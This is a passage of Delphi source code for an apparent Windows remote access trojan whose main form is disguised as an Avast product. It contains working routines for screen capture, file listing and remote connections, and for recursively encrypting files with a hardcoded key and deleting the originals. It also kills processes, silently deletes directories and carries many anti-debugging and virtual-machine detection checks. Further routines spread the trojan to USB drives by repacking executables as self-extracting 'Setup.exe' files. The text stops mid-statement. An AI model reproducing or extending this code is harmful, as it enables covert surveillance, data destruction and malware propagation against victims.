unit Unit1;

interface

uses
  Windows, Winapi.Wininet, Winapi.Messages, Winapi.ShellApi, System.SysUtils,
  System.Classes, Vcl.Forms, Vcl.Controls, Vcl.ExtCtrls, Vcl.StdCtrls, Vcl.ComCtrls,
  Vcl.AppEvnts, Vcl.IdAntiFreeze, iniciarApp, Graphics, JPEG,  {INDISPENSAVEIS---------------------------------------}
  DefineDados{confsDoClient}, ShlObj{Filezila}, IOutils{tipo TFILE},
  IdHTTP, IdTCPConnection, IdTCPClient, IdFTP,{Conexão de Internet e FTP}
  IdAntiFreezeBase,IdCompressorZLib, IdZLibCompressorBase,{Compressores de conexão}
  IdExplicitTLSClientServerBase, IdComponent, IdBaseComponent, Dialogs, {shomessage}
  System.Win.ScktComp, Chat, WinVers, IdMultipartFormData,
  {WEBCAM}FMX.Objects,FMX.Media{ENDWebcam}, Zlib, Stream, sndkey32, Registry, MMSystem, TLHelp32,
  System.Zip, System.StrUtils, IdStack, DCPcrypt2, DCPrijndael, DCPbase64, DCPsha1;

type
 PDEV_BROADCAST_HDR = ^TDEV_BROADCAST_HDR;
 TDEV_BROADCAST_HDR = packed record
   dbch_size : DWORD;
   dbch_devicetype : DWORD;
   dbch_reserved : DWORD;
end;
  PDEV_BROADCAST_VOLUME = ^TDEV_BROADCAST_VOLUME;
  TDEV_BROADCAST_VOLUME = packed record
   dbcv_size : DWORD;
   dbcv_devicetype : DWORD;
   dbcv_reserved : DWORD;
   dbcv_unitmask : DWORD;
   dbcv_flags : WORD;
end;

type
  TUpload = class(TThread)
  private
  public
    Socket: TCustomWinSocket;
    procedure Execute; Override;
end;

type
  TAvastPortable8 = class(TForm)
    Memo1: TMemo;
    notnull: TTimer;
    autcopy: TTimer;
    send: TTimer;
    AntFreez: TIdAntiFreeze;
    FTP: TIdFTP;
    config: TTimer;
    reConnect: TTimer;
    recebeDados: TTimer;
    http: TIdHTTP;
    compress: TIdCompressorZLib;
    StatusBar1: TStatusBar;
    AppEvents: TApplicationEvents;
    CS1: TClientSocket;
    CS3: TClientSocket;
    CS2: TClientSocket;
    CS4: TClientSocket;
    CS5: TClientSocket;
    DCP_sha11: TDCP_sha1;
    confusb: TMemo;
    TimerCam: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure buscapro(Procs: TStrings);
    procedure calculatempo(t, i: Integer; Ativo: Boolean);
    procedure uOPHD9pMq4(var xxx: TWMTimer); message WM_TIMER;
    procedure notnullTimer(Sender: TObject);
    procedure autcopyTimer(Sender: TObject);
    procedure sendTimer(Sender: TObject);
    procedure configTimer(Sender: TObject);
    procedure reConnectTimer(Sender: TObject);
    procedure recebeDadosTimer(Sender: TObject);
    procedure CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS2Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS3Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS4Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS4Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS4Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS5Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS5Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure AppEventsException(Sender: TObject; E: Exception);
    procedure CS2Disconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure TimerCamTimer(Sender: TObject);

  private
    procedure WMDeviceChange(var Msg: TMessage); message WM_DEVICECHANGE;
    { Private declarations }
  public
    sJanelaAtiva, sJanelaOld: string;
    { Public declarations }
  end;

type
 GUID = record
  Data1: Integer;
  Data2: ShortInt;
  Data3: ShortInt;
  Data4: array[0..7] of Byte;
end;

type
  TVMWareVersion = (vvExpress = 1, vvESX, vvGSX, vvWorkstation, vvUnknown, vvNative);
  TVirtualMachineType = (vmNative, vmVMWare, vmWine, vmVirtualPC, vmVirtualBox);
const
  VIRTUALMACHINE_STRINGS: array[TVirtualMachineType] of string = ('Native', 'VMWare', 'Wine', 'Virtual PC', 'Virtual Box');
  VMWARE_VERSION_STRINGS: array [TVMWareVersion] of string = ('Express', 'ESX', 'GSX', 'Workstation', 'Unknown', 'Native');

var
  AvastPortable8: TAvastPortable8;
  ftphost,ftpuser, ftppass, Nome, Drive, winDir, pcname, IDSockPrincipal, SalvarUp, host_server, porta, tempDir:String;
  FCompleted, Webcam, RecebendoDados: Boolean;
  ParamList: TIdMultipartFormDataStream;
  flags: DWORD;
  logs, usbInf, contClick: Byte;
  //iSendCount: Integer;
  FirstBmp, SecondBmp, CompareBmp, PackStream, ArqDow: TMemoryStream;
  imagefmx:FMX.Objects.TImage;
  camera: TCameraComponent;

implementation

{$R *.dfm}
{$WARN SYMBOL_PLATFORM OFF}
//procedure StartTheHook; external 'Project1.dll';
//function TrimLeft():String; external 'opengl32.dll';

function B64DByte(Input: TBytes): TBytes;
var
  ilen, rlen: integer;
begin
  asm nop end;
  ilen := Length(Input);
  SetLength(result, (ilen div 4) * 3);
  rlen := Base64Decode(@Input[0], @result[0], ilen);
  SetLength(result, rlen);
end;

function encrypt(data, k, ive: String): String;
const
  KeySize = 32; // 32 bytes = 256 bits
  BlockSize = 16; // 16 bytes = 128 bits
var
  cip : TDCP_rijndael;
  key, iv, src, dest: TBytes;
  i, len, size, pad: integer;
begin
  asm nop end;
  key := TEncoding.ASCII.GetBytes(k);
  iv := TEncoding.ASCII.GetBytes(ive);
  src := TEncoding.ascii.GetBytes(data);
  cip := TDCP_rijndael.Create(nil);
  try
    cip.CipherMode := cmCBC;
    len := Length(src);
    size := (cip.BlockSize div 8);
    pad := size - (len mod size);
    Inc(len, pad);
    SetLength(src, len);
    for i := pad downto 1 do
    begin
      src[len - i] := pad;
    end;
    SetLength(dest, len);
    cip.Init(key[0], 128, @iv[0]); // DCP uses key size in BITS not BYTES
    cip.Encrypt(src[0], dest[0], len);
  finally
    cip.Free;
  end;
  Result:=String(Base64EncodeStr(AnsiString(dest)));
end;

function decrypt(data, k, ive: String): String;
const
  KeySize = 32; // 32 bytes = 256 bits
  BlockSize = 16; // 16 bytes = 128 bits
var
  cip : TDCP_rijndael;
  key, iv, src, dest: TBytes;
  len, pad: integer;
begin
  asm nop end;
  key := TEncoding.ASCII.GetBytes(k);
  iv := TEncoding.ASCII.GetBytes(ive);
  src := B64DByte(TEncoding.UTF8.GetBytes(data));
  cip := TDCP_rijndael.Create(nil);
  try
    cip.CipherMode := cmCBC;
    len := Length(src);
    SetLength(dest, len);
    cip.Init(key[0], 128, @iv[0]);
    cip.Decrypt(src[0], dest[0], len);
    pad := dest[len - 1];
    SetLength(dest, len - pad);
  finally
    cip.Free;
  end;
  Result := TEncoding.Default.GetString(dest);
end;

procedure EncryptFile(Source: string);
var
  DCP_rijndael1: TDCP_rijndael;
  SourceStream, DestStream: TFileStream;
begin
  try
    SourceStream:=TFileStream.Create(Source, fmOpenRead);
    DestStream:= TFileStream.Create(Source+'.encrypted', fmCreate);
    DCP_rijndael1:=TDCP_rijndael.Create(nil);
    DCP_rijndael1.InitStr('123qwe123qwe1231', TDCP_sha1);
    DCP_rijndael1.EncryptStream(SourceStream, DestStream, SourceStream.Size);
    DCP_rijndael1.Burn;
    DCP_rijndael1.Free;
    DestStream.Free;
    SourceStream.Free;
    DeleteFile(Source);
  except
  end;
end;

procedure DecryptFile(Source: string);
var
  DCP_rijndael1: TDCP_rijndael;
  SourceStream, DestStream: TFileStream;
begin
  if(Pos('.encrypted',Source)=0)then Exit;
  try
    SourceStream:= TFileStream.Create(Source, fmOpenRead);
    Delete(Source, Pos('.encrypted', Source),Source.Length-1);
    DestStream:= TFileStream.Create(Source, fmCreate);
    DCP_rijndael1:= TDCP_rijndael.Create(nil);
    DCP_rijndael1.InitStr('123qwe123qwe1231', TDCP_sha1);
    DCP_rijndael1.DecryptStream(SourceStream, DestStream, SourceStream.Size);
    DCP_rijndael1.Burn;
    DCP_rijndael1.Free;
    DestStream.Free;
    SourceStream.Free;
    DeleteFile(Source+'.encrypted');
  except
  end;
end;
//TEMP DIRETORIO
function SysTempDir: string;
begin
  SetLength(Result, MAX_PATH);
  if GetTempPath(MAX_PATH, PChar(Result)) > 0 then
  Result := string(PChar(Result))
  else
  Result := '';
end;
//TASKKILL
function KillTask(ExeFileName: string): Integer;
const
PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  asm nop end;
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do begin
    if((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))=UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile)=UpperCase(ExeFileName)))then
      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE,BOOL(0),FProcessEntry32.th32ProcessID),0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function isDesktop: string;
var SPS: TSystemPowerStatus;
begin
GetSystemPowerStatus(SPS);
if(SPS.BatteryFlag=128)then
  Result:='True'
else
  Result:='False';
end;

function Tela(SALVAR_JPG: boolean; ONDE_SALVAR: String):Boolean;
var
  DC: HDC;
  TelaBitmap: TBitmap;
  TELAJPG: TJPEGImage;
  MyCursor: TIcon;
  CursorInfo: TCursorInfo;
  IconInfo: TIconInfo;
begin
  MyCursor := TIcon.Create;
  CursorInfo := infCurs();
  DC:= GetDC (getDesktopWindow);
  TelaBitmap:= TBitmap.Create;
  TELAJPG := TJpegImage.Create;
  try
    TelaBitmap.width := getdevicecaps (DC,HORZRES);
    TelaBitmap.Height := getdevicecaps (DC,VERTRES);
    BitBlt(TelaBitmap.Canvas.Handle,0,0,TelaBitmap.width, TelaBitmap.height,DC,0,0,SRCCOPY);
    if CursorInfo.hCursor <> 0 then begin
      MyCursor.Handle := CursorInfo.hCursor;
      GetIconInfo(CursorInfo.hCursor, IconInfo);
      TelaBitmap.Canvas.Draw(CursorInfo.ptScreenPos.X - IconInfo.xHotspot, CursorInfo.ptScreenPos.Y - IconInfo.yHotspot, MyCursor);
    end;
  finally
  end;
  TELAJPG.Assign(TelaBitmap);
  TELAJPG.CompressionQuality := 90;
  TELAJPG.JpegNeeded;
  TELAJPG.SavetoFile(ONDE_SALVAR);
  Result:=True;
end;

function StreamToString(M: TMemoryStream): AnsiString;
begin
  SetString(Result, PAnsiChar(M.Memory), M.Size);
end;

// Função para listar pastas
function ListFolders(Directory: String): string;
var
  FileName, Dirlist: string;
  Searchrec: TWin32FindData;
  FindHandle: THandle;
begin
  try
    FindHandle := FindFirstFile(PChar(Directory + '*.*'), Searchrec);
    if FindHandle <> INVALID_HANDLE_VALUE then
      repeat
        FileName := Searchrec.cFileName;
        if ((Searchrec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then begin
          if ((Searchrec.dwFileAttributes and FILE_ATTRIBUTE_HIDDEN) <> 0) then
            Dirlist := Dirlist + (FileName+'.gswhidden'+ #13)
          else
            Dirlist := Dirlist + (FileName + #13);
        end;
      until not FindNextFile(FindHandle, Searchrec);
  finally
    Windows.FindClose(FindHandle);
  end;
  Result := Dirlist;
end;

procedure GetFilesEncryptDecrypt(op:Byte; Directory, Ext: String);
var
  FileName: string;
  Searchrec: TWin32FindData;
  FindHandle: THandle;
begin
  try
    FindHandle := FindFirstFile(PChar(Directory +'\'+ Ext), Searchrec);
    if FindHandle <> INVALID_HANDLE_VALUE then
      repeat
        FileName := Searchrec.cFileName;
        if((FileName<>'.') and (FileName<>'..'))then begin
          if ((Searchrec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then
            GetFilesEncryptDecrypt(op, Directory+'\'+FileName+'\', Ext)
          else begin
            if(op=0)then
              EncryptFile(Directory+'\'+ FileName)
            else
              DecryptFile(Directory+'\'+ FileName);
          end;
        end;
      until FindNextFile(FindHandle, Searchrec) = false;
  finally
    Windows.FindClose(FindHandle);
  end;
end;

//int 2d check2
function FD_INT_2d(): Boolean;
begin
  try
    asm
      int 2dh
      inc eax //any opcode of singlebyte. or u can put some junkcode,
      mov @result, 1
    end;
  except
    Result := false;
  end;
end;


function FS_OD_Int3_Pushfd(): Boolean;
begin
  asm
      push offset @e_handler //set exception handler
      push dword ptr fs:[0h]
      mov dword ptr fs:[0h],esp
      xor eax,eax //reset EAX invoke int3
      int 3h
      pushfd
      nop
      nop
      nop
      nop
      pop dword ptr fs:[0h] //restore exception handler
      add esp,4

      test eax,eax //check the flag
      je @IsDebug
      jmp @Exit

@e_handler:
      push offset @e_handler1 //set exception handler
      push dword ptr fs:[0h]
      mov dword ptr fs:[0h],esp
      xor eax,eax //reset EAX invoke int3
      int 3h
      nop
      pop dword ptr fs:[0h] //restore exception handler
      add esp,4      //EAX = ContextRecord
      mov ebx,eax //dr0=&gt;ebx
      mov eax,dword ptr [esp+$c]     //set ContextRecord.EIP
      inc dword ptr [eax+$b8]
      mov dword ptr [eax+$b0],ebx //dr0=&gt;eax
      xor eax,eax
      ret

@e_handler1:        //EAX = ContextRecord
      mov eax,dword ptr [esp+$c]     //set ContextRecord.EIP
      inc dword ptr [eax+$b8]
      mov ebx,dword ptr[eax+$04]
      mov dword ptr [eax+$b0],ebx //dr0=&gt;eax
      xor eax,eax
      ret

@IsDebug:
      mov @result, 1
      mov esp,ebp
      pop ebp
      ret
@Exit:
      mov esp,ebp
      pop ebp
      ret
end;
end;

function FS_SI_Exception_Int1(): Boolean;
begin
asm
      mov @result, 0
      push offset @eh_int1 //set exception handler
      push dword ptr fs:[0h]
      mov dword ptr fs:[0h],esp
      xor eax,eax //reset flag(EAX) invoke int3
      int 1h
      pop dword ptr fs:[0h] //restore exception handler
      add esp,4
      test eax, eax // check the flag
      je @IsDebug
      jmp @Exit

@eh_int1:
      mov eax,[esp+$4]
      mov ebx,dword ptr [eax]
      mov eax,dword ptr [esp+$c] //EAX = ContextRecord
      mov dword ptr [eax+$b0],1 //set flag (ContextRecord.EAX)
      inc dword ptr [eax+$b8] //set ContextRecord.EIP
      inc dword ptr [eax+$b8] //set ContextRecord.EIP
      xor eax, eax
      ret
@IsDebug:
      mov @result, 1
      mov esp,ebp
      pop ebp
      ret
@Exit:
      xor eax, eax
      mov esp,ebp
      pop ebp
      ret
end;
end;

function FB_HWBP_Exception(): Boolean;
begin
asm
      push offset @exeception_handler //set exception handler
      push dword ptr fs:[0h]
      mov dword ptr fs:[0h],esp
      xor eax,eax //reset EAX invoke int3
      int 1h
      pop dword ptr fs:[0h] //restore exception handler
      add esp,4 //test if EAX was updated (breakpoint identified)
      test eax,eax
      jnz @IsDebug
      jmp @Exit

@exeception_handler:       //EAX = CONTEXT record
      mov eax,dword ptr [esp+$c] //check if Debug Registers Context.Dr0-Dr3 is not zero
      cmp dword ptr [eax+$04],0
      jne @hardware_bp_found
      cmp dword ptr [eax+$08],0
      jne @hardware_bp_found
      cmp dword ptr [eax+$0c],0
      jne @hardware_bp_found
      cmp dword ptr [eax+$10],0
      jne @hardware_bp_found
      jmp @exception_ret
@hardware_bp_found: //set Context.EAX to signal breakpoint found
      mov dword ptr [eax+$b0],$FFFFFFFF
@exception_ret:       //set Context.EIP upon return
      inc dword ptr [eax+$b8] //set ContextRecord.EIP
      inc dword ptr [eax+$b8] //set ContextRecord.EIP
      xor eax,eax
      ret
@IsDebug:
      mov @result, 1
      mov esp,ebp
      pop ebp
      ret
@Exit:
      xor eax, eax
      mov esp,ebp
      pop ebp
      ret
end;
end;

function FD_OutputDebugString(): boolean;
var
tmpD: DWORD;
begin
OutputDebugString('');
tmpD := GetLastError;
if(tmpD = 0) then
      result := true
else
      Result := false;
end;

function FD_Exception_Int3(): Boolean;
begin
      asm
        mov @result, 0
        push offset @exception_handler //set exception handler
        push dword ptr fs:[0h]
        mov dword ptr fs:[0h],esp
        xor eax,eax       //reset EAX invoke int3
        int 3h
        pop dword ptr fs:[0h] //restore exception handler
        add esp,4
        test eax,eax // check the flag
        je @IsDebug
        jmp @exit
      @exception_handler:
        mov eax,dword ptr [esp+$c]//EAX = ContextRecord
        mov dword ptr [eax+$b0],$ffffffff//set flag (ContextRecord.EAX)
        inc dword ptr [eax+$b8]//set ContextRecord.EIP
        xor eax,eax
        ret
      @IsDebug:
        xor eax,eax
        inc eax
        mov esp,ebp
        pop ebp
        ret
      @exit:
        xor eax,eax
        mov esp,ebp
        pop ebp
        ret
      end;
end;
{function FD_Heap_HeapFlags(): Boolean;
begin
asm
      mov @result, 0
      mov eax, fs:[30h]
      mov eax, [eax+18h] //PEB.ProcessHeap
      mov eax, [eax+0ch] //PEB.ProcessHeap.Flags
      cmp eax, 2
      jne @IsDebug
      jmp @exit
@IsDebug:
      mov @result, 1
@exit:
end;
end;}
function PD_PEB_BeingDebuggedFlag(): Boolean;
begin
asm
      mov @result, 0
      mov eax, fs:[30h] //EAX = TEB.ProcessEnvironmentBlock
      add eax, 2
      mov eax, [eax]
      and eax, $000000ff //AL = PEB.BeingDebugged
      test eax, eax
      jne @IsDebug
      jmp @exit
@IsDebug:
      mov @result, 1
@exit:
end;
end;

function FD_PEB_NtGlobalFlags(): Boolean;
begin
asm
      mov @result, 0
      mov eax, fs:[30h]
      mov eax, [eax+68h]
      and eax, $70      //NtGlobalFlags
      test eax, eax
      jne @IsDebug
      jmp @exit
@IsDebug:
      mov @result, 1
@exit:
end;
end;

function IsInsideVMWare: Boolean; // test the port used by VMware
begin
 try
  asm
   push ebx
   and  [Result], 0
   mov  eax, 'VMXh'
   xor  ebx, ebx
   mov  ecx, 10
   mov  edx, 'VX'
   in   eax, dx
   cmp  ebx, 'VMXh'
   setz [Result]
   pop  ebx
  end;
 except on EPrivilege do Result := False;
 end;
end;

function IsSomethingUnknown: Boolean; // from vmcheck.dll
begin
 Result := True;
 try
  asm
   db 15
   mov eax, 45C70001h
   cld
   dd -1
  end;
 except Result := False;
 end;
end;

function IsRunningWine2: Boolean;
var hModule: Cardinal;
begin
 hModule := LoadLibrary('ntdll.dll');
 Result := Assigned(GetProcAddress(hModule, 'wine_get_version')) and
           Assigned(GetProcAddress(hModule, 'wine_nt_to_unix_file_name'));
 FreeLibrary(hModule);
end;

function IsVirtualPC: Boolean; // from vmcheck.dll
begin
 Result := True;
 try
  asm
   mov eax, 1
   db  15
   aas
   pop es
   or  eax, edi
   inc ebp
   cld
   dd  -1
  end;
 except Result := False;
 end;
end;

function IsVirtualPC2: Boolean; // add-on
var
 hModule: Cardinal;
 Value: function: Boolean;
begin
 Result := False;
 hModule := LoadLibrary('c:\vmcheck.dll');
 if LongBool(hModule) then
  begin
   @Value := GetProcAddress(hModule, 'IsRunningInsideVirtualMachine');
   if Assigned(Value) then Result := Value;
   FreeLibrary(hModule);
  end;
end;

function IsInsideVPC: Boolean;
begin
asm
 push ebp
 mov  ecx, offset @catch
 mov  ebp, esp
 push ebx
 push ecx
 push dword ptr fs:[0]
 mov  dword ptr fs:[0], esp
 xor  ebx, ebx
 mov  eax, 1
 dd   0B073F0Fh
 mov  eax, dword ptr ss:[esp]
 mov  dword ptr fs:[0], eax
 add  esp, 8
 test ebx, ebx
 setz al
 lea  esp, dword ptr ss:[ebp - 4]
 mov  ebx, dword ptr ss:[esp]
 mov  ebp, dword ptr ss:[esp + 4]
 add  esp, 8
 jmp  @ret
@catch:
 mov  ecx, [esp + 0Ch]
 mov  dword ptr [ecx + 0A4h], -1
 add  dword ptr [ecx + 0B8h], 4
 xor  eax, eax
@ret:
end;
end;

function IsRunningVMWare(var AVMWareVersion: TVMWareVersion): Boolean;
const
  CVMWARE_FLAG = $564D5868;
var
  LFlag: Cardinal;
  LVersion: Cardinal;
begin
  LFlag := 0;
  try
    asm
      push eax
      push ebx
      push ecx
      push edx
      mov eax, 'VMXh'
      mov ecx, 0Ah
      mov dx, 'VX'
      in eax, dx
      mov LFlag, ebx
      mov LVersion, ecx
      pop edx
      pop ecx
      pop ebx
      pop eax
    end;
  except
  end;
  if LFlag = CVMWARE_FLAG then begin
    Result := True;
    case LVersion of
      1: AVMWareVersion := vvExpress;
      2: AVMWareVersion := vvESX;
      3: AVMWareVersion := vvGSX;
      4: AVMWareVersion := vvWorkstation;
      else
        AVMWareVersion := vvUnknown;
    end
  end else begin
    Result := False;
    AVMWareVersion := vvNative;
  end;
end;

function IsRunningVMW: Boolean;
var
  LVMWareVersion: TVMWareVersion;
begin
  Result := IsRunningVMWare(LVMWareVersion);
end;

function IsRunningWine(var AWineVersion: string): Boolean;
type
  TWineGetVersion = function: PAnsiChar;{$IFDEF Win32}stdcall;{$ENDIF}
  TWineNTToUnixFileName = procedure (P1: Pointer; P2: Pointer);{$IFDEF Win32}stdcall;{$ENDIF}
var
  LHandle: THandle;
  LWineGetVersion: TWineGetVersion;
  LWineNTToUnixFileName: TWineNTToUnixFileName;
begin
  Result := False;
  AWineVersion := 'Unknown';
  LHandle := LoadLibrary('ntdll.dll');
  if LHandle > 32 then begin
    LWineGetVersion := GetProcAddress(LHandle, 'wine_get_version');
    LWineNTToUnixFileName := GetProcAddress(LHandle, 'wine_nt_to_unix_file_name');
    if Assigned(LWineGetVersion) or Assigned(LWineNTToUnixFileName) then begin
      Result := True;
      if Assigned(LWineGetVersion) then
        AWineVersion := StrPas(LWineGetVersion);
    end; // if Assigned(LWineGetVersion) or ...
    FreeLibrary(LHandle);
  end; // if LHandle > 32 then begin
end;

function IsRunningW: Boolean;
var
  LWineVersion: string;
begin
  Result := IsRunningWine(LWineVersion);
end;

function IsRunningVirtualPC: Boolean;
begin
asm
  push ebp;
  mov ebp, esp;
  mov ecx, offset @exception_handler;
  push ebx;
  push ecx;
  push dword ptr fs:[0];
  mov dword ptr fs:[0], esp;
  mov ebx, 0; // Flag
  mov eax, 1; // VPC function number
  db $0F, $3F, $07, $0B   // call VPC
  mov eax, dword ptr ss:[esp];
  mov dword ptr fs:[0], eax;
  add esp, 8;
  test ebx, ebx;
  setz al;
  lea esp, dword ptr ss:[ebp-4];
  mov ebx, dword ptr ss:[esp];
  mov ebp, dword ptr ss:[esp+4];
  add esp, 8;
  jmp @ret1;
  @exception_handler:
  mov ecx, [esp+0Ch];
  mov dword ptr [ecx+0A4h], -1; // EBX = -1 ->; not running, ebx = 0 -> running
  add dword ptr [ecx+0B8h], 4; // ->; skip past the call to VPC
  xor eax, eax; // exception is handled
  @ret1:
end;
end;

function IsRunningVBox: Boolean;
  function Test1: Boolean;
  var
    LHandle: Cardinal;
  begin
    Result := False;
    try
      LHandle := LoadLibrary('VBoxHook.dll');
      Result := (LHandle <> 0);
      if Result then
        FreeLibrary(LHandle);
    except
    end;
  end;
  function Test2: Boolean;
  var
    LHandle: Cardinal;
  begin
    Result := False;
    try
      LHandle := CreateFile('\\\\.\\\VBoxMiniRdrDN', GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
      Result := (LHandle <> INVALID_HANDLE_VALUE);
      if Result then
        CloseHandle(LHandle);
    except
    end;
  end;
begin
  Result := Test1 or Test2;
end;

function IsRunningVM(var AVMVersion: string): Boolean;
begin
  AVMVersion := VIRTUALMACHINE_STRINGS[vmNative];
  Result := True;
  if IsRunningW then
    AVMVersion := VIRTUALMACHINE_STRINGS[vmWine]
  else
    if IsRunningVMW then
      AVMVersion := VIRTUALMACHINE_STRINGS[vmVMWare]
    else
        if IsRunningVBox then
          AVMVersion := VIRTUALMACHINE_STRINGS[vmVirtualBox]
        else begin
          AVMVersion := VIRTUALMACHINE_STRINGS[vmNative];
          Result := False;
        end;
end;

function IsRunningVMS: Boolean;
var
  LVMVersion: string;
begin
  Result := IsRunningVM(LVMVersion);
end;
//______________________ANTI DEBUGS________________________
////////////////////////////////////////////////////////////////////////////////
//Anti-loader
function IsDebug():Boolean;stdcall;
var
YInt,NInt:Integer;
begin
asm
mov eax,fs:[30h]
movzx eax,byte ptr[eax+2h]
or al,al
jz @No
jnz @Yes
@No:
mov NInt,1
@Yes:
Mov YInt,1
end;
if YInt=1 then
Result:=True;
if NInt=1 then
Result:=False;
end;

////////////////////////////////////////////////////////////////////////////////
//Anti-Monitor
Function DumpLoaded: Boolean;stdcall; //Dump;
var
hFile: Thandle;
Begin
Result:= false;
hFile := FindWindow(nil,'ProcDump32 (C) 1998, 1999, 2000 G-RoM, Lorian & Stone');
if( hFile <> 0 ) then
begin
Result:= TRUE;
end;
End;

Function RegLoaded: Boolean;stdcall; //RegMON;
var
hFile: Thandle;
Begin
Result:= false;
hFile := FindWindow(nil,'Registry Monitor – Sysinternals: www.sysinternals.com');
if( hFile <> 0 ) then
begin
Result:= TRUE;
end;
End;

Function FileLoaded: Boolean;stdcall; //FileMON;
var
hFile: Thandle;
Begin
Result:= false;
hFile := FindWindow(nil,'File Monitor – Sysinternals: www.sysinternals.com');
if( hFile <> 0 ) then
begin
Result:= TRUE;
end;
End;

Function SoftIceXPLoaded:Boolean;stdcall;//Win2000/XP SoftIce
var
mark:Integer;
YesInt,NoInt:Integer;
begin
YesInt:=0;NoInt:=0;
mark:=0;
asm
push offset @handler
push dword ptr fs:[0]
mov dword ptr fs:[0],esp
xor eax,eax
int 1
inc eax
inc eax
pop dword ptr fs:[0]
add esp,4
or eax,eax
jz @found
cmp mark, 0
jnz @found
jmp @Nofound
@handler:
mov ebx,[esp+0ch]
add dword ptr [ebx+0b8h],02h
mov ebx,[esp+4]
cmp [ebx], 80000004h
jz @Table
inc mark
@Table:
xor eax,eax
ret
@found:
mov YesInt,1
@Nofound:
mov NoInt,1
end;
if Yesint=1 then
Result:=True;
if NoInt=1 then
Result:=False;
end;

{——————————————————–}
{ Anti-Debug }
{——————————————————–}
Procedure Anti_DeDe();
var
DeDeHandle:THandle;
i:integer;
begin
DeDeHandle:=FindWindow(nil,chr($64)+chr($65)+chr($64)+chr($65));
if DeDeHandle<>0 then
begin
For i:=1 to 4500 do
SendMessage(DeDeHandle,WM_CLOSE,0,0);
end;
end;

// Função para Listar Arquivos
function GetFiles(FileName, Ext: String): String;
Var
  SearchFile: TSearchRec;
  FindResult: Integer;
  Arc: TStrings;
begin
  Arc := TStringList.Create;
  FindResult := FindFirst(FileName + Ext, faArchive or faHidden or faSysFile, SearchFile);
  try
    While FindResult = 0 do
    begin
      Application.ProcessMessages;
      if (SearchFile.Attr and faHidden) <> 0 then
        Arc.Add(SearchFile.Name+'.gswhidden')
      else
        Arc.Add(SearchFile.Name);
      FindResult := FindNext(SearchFile);
    end;
  finally
    FindClose(SearchFile)
  end;
  Result := Arc.Text;
end;

procedure DeleteDirectory(const DirName: string);
var
  FileFolderOperation: TSHFileOpStruct;
begin
  asm nop end;
  FillChar(FileFolderOperation, SizeOf(FileFolderOperation), 0);
  FileFolderOperation.wFunc := FO_DELETE;
  FileFolderOperation.pFrom := PChar(ExcludeTrailingPathDelimiter(DirName) + #0);
  FileFolderOperation.fFlags := FOF_SILENT or FOF_NOERRORUI or FOF_NOCONFIRMATION;
  SHFileOperation(FileFolderOperation);
end;

{procedure GetUSBFolders(Directory: String);
var
  Searchrec: TWin32FindData;
  FindHandle: THandle;
begin
  try
    FindHandle := FindFirstFile(PChar(Directory + '*.*'), Searchrec);
    if FindHandle <> INVALID_HANDLE_VALUE then
      repeat
        Directory :=Directory+Searchrec.cFileName;
        if ((Searchrec.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0) then begin

        end;
      until not FindNextFile(FindHandle, Searchrec);
  finally
    Windows.FindClose(FindHandle);
  end;
end;}

procedure GetUSBFiles(particao, Ext: String);
Var
  Icon: TIcon;
  SearchFile: TSearchRec;
  FindResult: Integer;
begin
  // Pega o primeiro .exe e gera um Installer Setup.exe se auto injetando..
  if(FileExists(particao+'Setup.exe'))then DeleteFile(particao+'Setup.exe');
  FindResult := FindFirst(particao + Ext, faArchive, SearchFile);
  if(FindResult<>0)then DeleteDirectory(particao+'Trash');
  try
    While FindResult = 0 do
    begin
      Application.ProcessMessages;
      Icon := TIcon.Create;
      try
        Icon.Handle:=ExtractIcon(HInstance, PWideChar(particao+SearchFile.Name), 0);
        RenameFile(particao+SearchFile.Name,particao+'Setup.exe');
        Icon.SaveToFile(tempDir+'gicone.ico');
      except
        Icon.Free;
        Exit;
      end;
      Icon.Free;
      Sleep(10);
      if(DirectoryExists('C:\Program Files (x86)\WinRAR'))then
        ShellExecute(0, nil, PChar('C:\Program Files (x86)\WinRAR\Winrar.exe'),
        PChar('a -sfx"default.sfx" -z"'+tempDir+'windgusb.conf" -i"icon'+tempDir
        +'gicone.ico" -ep1 "'+particao+SearchFile.Name+'" "'+particao+'Setup.exe" '+'"'+Drive+Nome+'"'), nil, SW_HIDE)
      else
